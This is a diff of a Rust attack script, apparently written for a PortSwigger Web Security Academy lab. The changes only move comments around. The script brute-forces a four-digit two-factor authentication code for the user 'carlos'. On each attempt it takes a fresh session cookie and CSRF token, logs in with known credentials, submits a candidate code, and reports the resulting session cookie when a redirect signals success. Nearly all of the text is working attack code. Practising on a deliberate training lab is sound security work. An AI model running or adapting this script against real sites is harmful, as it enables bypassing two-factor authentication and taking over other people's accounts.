@@ -59,11 +59,22 @@ lazy_static! {
 * Main Function
 *******************/
 fn main() {
+    // change this to your lab URL
+    let url = "https://0a2800260408bd5d8776e031006500e2.web-security-academy.net";
+
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
+
+    // capture the time before starting
     let start_time = time::Instant::now();
-    let url = "https://0a2800260408bd5d8776e031006500e2.web-security-academy.net"; // change this to your lab URL
-    let client = build_client(); // build the client that will be used for all subsequent requests
-    brute_force_2fa(start_time, &client, url); // start brute forcing the mfa-code
-    println!("\n{}", "[!] No valid code is found".red().bold()); // if this line is reached, it means that no valid code is found
+
+    // start brute forcing the mfa-code
+    brute_force_2fa(start_time, &client, url);
+
+    // if this line is reached, it means that no valid code is found
+    println!("\n{}", "[!] No valid code is found".red().bold());
+
+    // print some useful information to the terminal
     print_finish_message(start_time);
     print_failed_requests();
 }
@@ -77,15 +88,20 @@ fn brute_force_2fa(start_time: Instant, client: &Client, url: &str) {
         "[#] Brute forcing the mfa-code of".white().bold(),
         "carlos".green().bold()
     );
+    // iterate over all numbers
     for code in 0..10000 {
-        // iterate over all numbers
-        let get_login = client.get(format!("{url}/login").as_str()).send(); // GET /login page
+        // GET /login page
+        let get_login = client.get(format!("{url}/login").as_str()).send();
 
+        // if you GET /login successfully
         if let Ok(get_login_res) = get_login {
-            // if you GET /login successfully
-            let get_login_session = extract_session_cookie(get_login_res.headers()); // get the new session
-            let get_login_csrf = extract_csrf(get_login_res); // get the csrf token
+            // get the new session
+            let get_login_session = extract_session_cookie(get_login_res.headers());
 
+            // get the csrf token
+            let get_login_csrf = extract_csrf(get_login_res);
+
+            // try to login with valid credentials
             let post_login = client
                 .post(format!("{url}/login"))
                 .header("Cookie", format!("session={get_login_session}"))
@@ -94,18 +110,25 @@ fn brute_force_2fa(start_time: Instant, client: &Client, url: &str) {
                     ("password", "montoya"),
                     ("csrf", &get_login_csrf),
                 ]))
-                .send(); // try to login with valid credentials
+                .send();
 
+            // if you logged in successfully
             if let Ok(post_login_res) = post_login {
-                // if you logged in successfully
-                let post_login_session = extract_session_cookie(post_login_res.headers()); // get the new session
+                // get the new session
+                let post_login_session = extract_session_cookie(post_login_res.headers());
+
+                // GET /login2 with the new session
                 let get_login2 = client
                     .get(format!("{url}/login2"))
                     .header("Cookie", format!("session={post_login_session}"))
-                    .send(); // GET /login2 with the new session
+                    .send();
+
+                // if you GET /login2 successfully
                 if let Ok(get_login2_res) = get_login2 {
-                    // if you GET /login2 successfully
-                    let get_login2_csrf = extract_csrf(get_login2_res); // get the new csrf token
+                    // get the new csrf token
+                    let get_login2_csrf = extract_csrf(get_login2_res);
+
+                    // try to POST the mfa-code with the new session and the new csrf token
                     let post_code = client
                         .post(format!("{url}/login2"))
                         .header("Cookie", format!("session={post_login_session}"))
@@ -113,18 +136,21 @@ fn brute_force_2fa(start_time: Instant, client: &Client, url: &str) {
                             ("csrf", &get_login2_csrf),
                             ("mfa-code", &format!("{code:04}")),
                         ]))
-                        .send(); // try to POST the mfa-code with the new session and the new csrf token
+                        .send();
 
+                    // if POST code is done successfully
                     if let Ok(post_code_res) = post_code {
-                        // if POST code is done successfully
+                        // if a redirect happens; this means a valid code
                         if post_code_res.status().as_u16() == 302 {
-                            // if a redirect happens; this means a valid code
                             println!(
                                 "\n✅ {}: {}",
                                 "Correct code".white().bold(),
                                 format!("{code:04}").green().bold(),
                             );
-                            let new_session = extract_session_cookie(post_code_res.headers()); // get the new session
+
+                            // get the new session
+                            let new_session = extract_session_cookie(post_code_res.headers());
+
                             println!(
                                 "{}: {}",
                                 "✅ New session".white().bold(),
@@ -137,9 +163,13 @@ fn brute_force_2fa(start_time: Instant, client: &Client, url: &str) {
                                     .bold(),
                                 "carlos".green().bold()
                             );
+
+                            // print useful information to the terminal
                             print_finish_message(start_time);
                             print_failed_requests();
-                            process::exit(0); // exit the program after printing useful information to the terminal
+
+                            // exit from the program
+                            process::exit(0);
                         } else {
                             // if the submitted code is incorrect
                             print!(
